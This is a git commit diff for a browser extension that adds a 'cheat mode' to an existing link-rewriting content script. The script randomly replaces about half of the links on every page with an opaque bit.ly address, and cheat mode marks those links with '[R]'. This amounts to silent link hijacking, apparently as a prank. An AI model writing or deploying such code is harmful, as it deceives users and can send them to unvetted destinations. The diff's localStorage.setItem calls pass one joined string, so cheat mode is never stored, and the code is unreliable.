c9ddf86cbd7a64773bdd1a9f0ccac154585030ad
MSGuy01 <msguy01@outlook.com>
2021-04-27 21:33:35 -0700

    Added cheat mode

--- background.js
+++ background.js
@@ -4,8 +4,12 @@ chrome.runtime.onMessage.addListener(
     console.log(sender.tab ?
                 "from a content script:" + sender.tab.url :
                 "from the extension");
-    if (request.greeting == "hello")
+    if (request.greeting == "extension") {
       sendResponse({farewell: localStorage.getItem("on")});
+    }
+    else if (request.greeting == "cheat") {
+      sendResponse({farewell: localStorage.getItem("cheat")});
+    }
   }
 );
 
@@ -13,14 +17,27 @@ chrome.extension.onConnect.addListener(function(port) {
     console.log("Connected .....");
     port.onMessage.addListener(function(msg) {
         console.log("message recieved" + msg);
-        if (localStorage.getItem("on") == "on") {
-        	console.log("NOW OFF");
-        	localStorage.setItem("on", "off");
+        if (msg == "toggle") {
+          if (localStorage.getItem("on") == "on") {
+            console.log("NOW OFF");
+            localStorage.setItem("on", "off");
+          }
+          else {
+            console.log("NOW ON");
+            localStorage.setItem("on", "on");
+          }
+          port.postMessage(localStorage.getItem("on"));
         }
-        else {
-        	console.log("NOW ON");
-        	localStorage.setItem("on", "on");
+        else if (msg == "cheat") {
+          if (localStorage.getItem("cheat") == "on") {
+            console.log("CHEAT MODE IS NOW OFF");
+            localStorage.setItem("cheat, off");
+          }
+          else {
+            console.log("CHEAT MODE IS NOW ON");
+            localStorage.setItem("cheat, on");
+          }
+          port.postMessage(localStorage.getItem("cheat"));
         }
-        port.postMessage(localStorage.getItem("on"));
     });
 })
--- content.js
+++ content.js
@@ -1,4 +1,4 @@
-chrome.runtime.sendMessage({greeting: "hello"}, function(response) {
+chrome.runtime.sendMessage({greeting: "extension"}, function(response) {
   console.log(response.farewell);
   localStorage.setItem("on", response.farewell);
   if (localStorage.getItem("on") == "on") {
@@ -7,10 +7,19 @@ chrome.runtime.sendMessage({greeting: "hello"}, function(response) {
       var random = Math.floor((Math.random() * 2) + 1);
       if (random == 2) {
         a[i].href = "http://bit.ly/30QqsQ2";
-        if (localStorage.getItem("cheat") == "on") {
-          let prevText = a[i].innerHTML;
-          a[i].innerHTML = "[R]" + prevText;
-        }
+      }
+    }
+  }
+});
+chrome.runtime.sendMessage({greeting: "cheat"}, function(response) {
+  console.log(response.farewell);
+  localStorage.setItem("cheat", response.farewell);
+  if (localStorage.getItem("cheat") == "on") {
+    var a = document.getElementsByTagName("a");
+    for (var i = 0; i < a.length; i++) {
+      if (a[i].href == "http://bit.ly/30QqsQ2") {
+        let prevLinkText = a[i].innerHTML;
+        a[i].innerHTML = "[R] " + prevLinkText;
       }
     }
   }
